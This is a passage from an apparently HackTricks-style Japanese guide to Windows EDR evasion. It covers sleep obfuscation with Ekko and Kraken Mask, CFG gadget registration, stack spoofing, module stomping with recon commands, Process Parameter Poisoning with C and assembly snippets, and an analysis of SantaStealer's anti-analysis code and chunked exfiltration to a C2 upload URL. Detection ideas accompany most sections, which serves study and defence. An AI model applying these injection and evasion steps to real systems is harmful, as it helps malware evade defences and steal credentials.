Import-time hooks は、対象の IAT に function が実際に存在する場合のみ trigger される。module が PEB-walk + hash（import entry なし）で API を解決する場合、loader の `ProcessImports()` path がその function を認識できるよう、実際の import を強制する。

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を生成するため、Reflective loader が imports を解決する際に interception が可能になる。

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` を patch する代わりに、implant が使用する **実際の wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook する。長時間の wait では、Ekko-style obfuscation chain で call を wrap し、idle 中に in-memory image を encrypt する。

- `CreateTimerQueueTimer` を使用して、crafted `CONTEXT` frame で `NtContinue` を呼び出す callback sequence をスケジュールする。
- Typical chain（x64）: image を `PAGE_READWRITE` に設定 → mapped image 全体に対して `advapi32!SystemFunction032` で RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE section を走査して **per-section permission を restore** → completion を signal。
- `RtlCaptureContext` は template `CONTEXT` を提供する。これを複数の frame に clone し、各 step を呼び出すために register（`Rip/Rcx/Rdx/R8/R9`）を設定する。

Operational detail: 長時間の wait では caller が image の masking 中も継続するよう、`WAIT_OBJECT_0` などの “success” を返す。この pattern は idle window 中に module を scanner から隠し、典型的な “patched `Sleep()`” signature を回避する。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の burst。
- 大きく連続した image-sized buffer に対する `advapi32!SystemFunction032` の使用。
- 大規模な `VirtualProtect` の後に custom per-section permission restoration が続く動作。

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled target では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget への最初の indirect jump は、通常 process を `STATUS_STACK_BUFFER_OVERRUN` で crash させる。これは gadget が module の CFG metadata に存在しないためである。hardened process 内で Ekko/Kraken-style chain を維持するには、次を行う。

- chain が使用するすべての indirect destination を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で登録する。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は **image base** から開始し、**image size 全体**をカバーしなければならない。
- manually mapped/PIC/stomped region では、代わりに **allocation base** と allocation size を使用する。
- dispatch gadget だけでなく、indirect に到達する export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）と、indirect target になる attacker-controlled executable section も mark する。

これにより、ROP/JOP-style sleep chain は “non-CFG process でのみ動作するもの” から、`/guard:cf` で compile された `explorer.exe`、browser、`svchost.exe` などの endpoint で再利用できる primitive になる。

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement は noisy であり、spoof された `Rip` が hardware shadow stack と一致しなければならないため、CET Shadow Stack system では破損する可能性がある。より安全な sleep-masking pattern は次の通り。

- 同じ process 内の別 thread を選び、`NtQueryInformationThread` を介してその `NT_TIB` / TEB の stack bounds（`StackBase`、`StackLimit`）を読み取る。
- 現在の thread の real TEB/TIB を backup する。
- `GetThreadContext` で real sleeping context を capture する。
- real `Rip` **だけ**を spoof context に copy し、spoof された `Rsp`/stack state はそのままにする。
- sleep window 中、spoof thread の `NT_TIB` を current TEB に copy し、stack walker が legitimate stack range 内で unwind するようにする。
- wait 完了後、original TIB と thread context を restore する。

これにより CET と整合する instruction pointer を維持しつつ、TEB の stack metadata を信頼して unwind を検証する EDR stack walker を欺くことができる。

### APC-based alternative: Kraken Mask

timer-queue dispatch の signature が強すぎる場合、同じ sleep-encrypt-spoof-restore sequence を、queued APC を使用する suspended helper thread から実行できる。

- entrypoint に `NtTestAlert` を指定した helper thread を作成する。
- `NtQueueApcThread` で準備済みの `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で drain する。
- default 64 KB thread stack を使い果たさないよう、chain state を helper stack ではなく heap に保存する。
- `NtSignalAndWaitForSingleObject` を使用して、start event の signal と block を atomic に行う。
- TIB/context を restore する前に main thread を suspend する（`NtSuspendThread` → restore → `NtResumeThread`）。これにより、scanner が半端に restore された stack を捕捉できる race window を縮小する。

これは `CreateTimerQueueTimer` + `NtContinue` signature を helper-thread/APC signature に置き換えつつ、同じ RC4 masking と stack-spoofing の目的を維持する。

Additional detection ideas
- sleep、wait、または APC dispatch の直前に実行される、`VmCfgCallTargetInformation` を伴う `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の前後で wrap される `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` に続く、current thread の TEB/TIB stack bounds への direct write。
- `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に indirect に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- signed module 内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような短い gadget signature を繰り返し使用する動作。


## Precision Module Stomping

Module stomping は、明らかな private executable memory を allocate したり、新しい sacrificial DLL を load したりする代わりに、target process 内にすでに mapped されている DLL の **`.text` section から** payload を実行する。overwrite target には、**loaded された disk-backed image** を選ぶべきである。その code space が、process が引き続き必要とする code path を破壊せずに payload を収容できる必要がある。

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような common module に対する naive な stomping は fragile である。その DLL が remote process に load されていない可能性があり、code region が小さすぎると process が crash する。より reliable な workflow は次の通り。

1. target process の module を enumerate し、すでに load されている DLL の **names-only include list** を保持する。
2. 先に payload を build し、**正確な byte size** を記録する。
3. candidate DLL を disk 上で scan し、PE section **`.text` の `Misc_VirtualSize`** と payload size を比較する。これは file size より重要である。mapped in memory 時の executable section の size を反映するためである。
4. **Export Address Table (EAT)** を parse し、export された function の RVA を stomp start offset として選択する。
5. **blast radius** を計算する。payload が選択した function boundary を超える場合、memory 上でその後に配置された隣接 export を overwrite する。

Typical recon/selection helper は、実環境では次のようなものが見られる。
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- `LoadLibrary`/unexpected image loads による telemetry を避けるため、リモートプロセスに**すでにロードされている** DLL を優先する。
- 対象アプリケーションによって実行される頻度が低い export を優先する。そうしないと、スレッド作成の前後に通常の code path が stomp された bytes に到達する可能性がある。
- 大規模な implant では、shellcode の埋め込みを string literal から**byte-array/braced initializer**に変更し、injector の source 内で完全な buffer が正しく表現されるようにする必要がある。

Detection のアイデア
- より一般的な private RWX/RX allocation ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）への remote write。
- メモリ上の export entry point の bytes が、ディスク上の backing file と一致しなくなっている。
- 最近 first bytes が変更された正規 DLL export 内から実行を開始する remote thread または context pivot。
- DLL の `.text` pages に対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の sequence と、それに続く thread creation。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来の remote write path（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique である。すでに実行中の target に bytes をコピーする代わりに、Windows が `CreateProcessW` の startup parameters の一部を child process に**コピー**し、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に保存する仕組みを悪用する。

### `CreateProcessW` によってコピーされる Poisonable carriers

利用可能な carriers は次のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` とともに使用） → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` のために **writable memory** を指している必要があり、null terminator を含めて **32,767 Unicode characters** に制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` strings で構成され、追加の `\0` で終端される Unicode environment block でなければならない。
- `lpReserved` は公式には reserved であるため、`ShellInfo` の mapping は、安定した documented contract ではなく implementation detail として扱うべきである。

これにより、通常の process creation が **payload-transfer primitive** になる。operator は attacker-controlled startup data を指定して child process を作成し、Windows に cross-process copy を実行させる。

### Remote write APIs を使用しない Remote lookup flow

child が作成された後、**read-only** primitives によってコピーされた buffer を解決する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. remote `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択した pointer を使用する：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

最小限の flow：
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### コピーされた parameter buffer の実行

コピーされた parameter region は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended ではない状態）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択した parameter page を実行可能にする
3. `PROCESS_INFORMATION` ですでに返されている main thread handle を再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行を redirect する

classic thread hijacking workflow とは異なり、これは `SuspendThread` / `ResumeThread` を**必要としません**。返された main thread handle に対して、context を直接変更できます。

これにより、injection で一般的に監視される複数の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避できます

### Null-byte の制限と staged shellcode

3 つすべての carrier は**文字列または文字列に類似したデータ**であるため、`0x00` を含む raw payload は transfer 中に切り詰められます。実用的な workaround は、runtime で constants を再構築し、その後任意の second stage を load する **null-free first stage** です。

単純な pattern は、XOR ベースの constant synthesis です。
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
これは、転送されるパラメータに null bytes を埋め込まずに、第一ステージでスタック文字列、API 引数、DLL パス、または第二ステージの shellcode loader を構築できるようにします。

### 第一ステージからのスタックベース API 呼び出し

第一ステージで `LoadLibraryA` などの API を呼び出す必要がある場合、次の処理を実行できます。

- ターゲットのスタックに文字列/バッファを push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインタを設定する
- call 前に `RSP` を **16-byte aligned** に保つ

その後、第二ステージをスタックから `PAGE_READWRITE` の allocation にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してから jump できます。これにより、直接的な RWX allocation を回避できます。

### Detection ideas

著者が挙げている有効な hunting の機会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって **process-parameter pages を executable にする** 操作
- その protection change に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` をリモートから読み取る操作
- プロセス作成時の異常に長い、または高エントロピーな `lpCommandLine`、`lpEnvironment`、`STARTUPINFO.lpReserved` の値

### Notes

- P3 は **cross-process transfer trick** であり、それ自体は完全な execution primitive ではありません。コピーされた parameter には、依然として execute-permission change と execution redirection method が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者によって検討されましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの suspicious primitives に到達するため、却下されました。

## Fileless Evasion と Credential Theft における SantaStealer Tradecraft

SantaStealer（別名 BluelineStealer）は、現代の info-stealer が AV bypass、anti-analysis、credential access を単一の workflow に組み合わせる方法を示しています。

### Keyboard layout gating と sandbox delay

- 設定フラグ（`anti_cis`）は、`GetKeyboardLayoutList` を使用してインストール済みの keyboard layouts を列挙します。Cyrillic layout が見つかった場合、sample は空の `CIS` marker を作成して stealers の実行前に終了します。これにより、除外された locale 上では決して detonate せず、同時に hunting artifact を残します。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層 `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前をカスタム rolling checksum でハッシュして、debugger/sandbox 用の埋め込み blocklist と比較する。また、コンピューター名に対しても checksum を繰り返し実行し、`C:\analysis` などの作業ディレクトリをチェックする。
- Variant B はシステムプロパティ（プロセス数の下限、最近の uptime）を調査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出する。また、sleep 前後のタイミングを確認して single-stepping を検出する。いずれかに該当すると、モジュールが起動する前に処理を中止する。

### Fileless helper + double ChaCha20 reflective loading

- プライマリ DLL/EXE には Chromium credential helper が埋め込まれており、ディスクにドロップするか、メモリ上に手動で map する。fileless モードでは imports/relocations を自身で解決するため、helper の痕跡は書き込まれない。
- この helper は、ChaCha20 で二重に暗号化された second-stage DLL（32-byte key × 2 + 12-byte nonce × 2）を格納する。両方の復号を終えると、blob を reflectively load（`LoadLibrary` は使用しない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports を呼び出す。
- ChromElevator routines は direct-syscall reflective process hollowing を使用して稼働中の Chromium browser に inject し、AppBound Encryption keys を継承する。その後、ABE hardening にもかかわらず、SQLite databases から passwords/cookies/credit cards を直接 decrypt する。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` function-pointer table を反復処理し、有効化された各モジュール（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとに 1 つの thread を生成する。各 thread は共有バッファーに結果を書き込み、約 45 秒の join window 後にファイル数を報告する。
- 完了後、すべてのデータを statically linked な `miniz` library で `%TEMP%\\Log.zip` として zip 化する。次に `ThreadPayload1` は 15 秒 sleep し、archive を 10 MB chunks に分割して、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を spoof しながら、`http://<C2>:6767/upload` へ HTTP POST で stream する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意の `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付加されるため、C2 は再構成の完了を把握できる。

## 参考資料

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
